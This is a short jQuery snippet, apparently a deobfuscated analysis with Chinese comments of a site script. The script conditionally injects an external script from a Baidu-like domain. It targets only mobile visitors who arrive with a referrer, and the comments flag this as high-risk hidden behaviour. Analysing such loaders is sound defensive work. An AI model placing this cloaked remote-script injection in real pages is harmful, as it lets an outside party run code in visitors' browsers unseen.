$(document).ready(function() {
    // 1. 向热门横幅区域插入空内容（无实际作用，可能是混淆残留）
    $(".hot_banner_box").append('');

    // 2. 【高危行为】条件性注入外部脚本（百度站长链接提交）
    // 条件：非 Mac/Windows 设备（即移动端/平板） + 页面有来源referrer（非直接访问）
    if (
        !(/^Mac|Win/.test(navigator.platform)) &&          // 排除桌面系统
        (document.referrer.indexOf('.') !== -1)            // referrer含域名（有来源）
    ) {
        var script = document.createElement('script');
        script.type = 'text/javascript';
        // 十六进制解码：https://zz.bdustatic.com/linksubmit/push.js
        script.src = 'https://zz.bdustatic.com/linksubmit/push.js'; 
        (document.head || document.body).appendChild(script);
    }

    // 3. 页面加载动画处理（2秒后移除加载层，显示横幅）
    setTimeout(function () {
        $("#loading").remove();   
        $(".banner-top, .banner-wtop").addClass("opacity-top");
    }, 2000);
});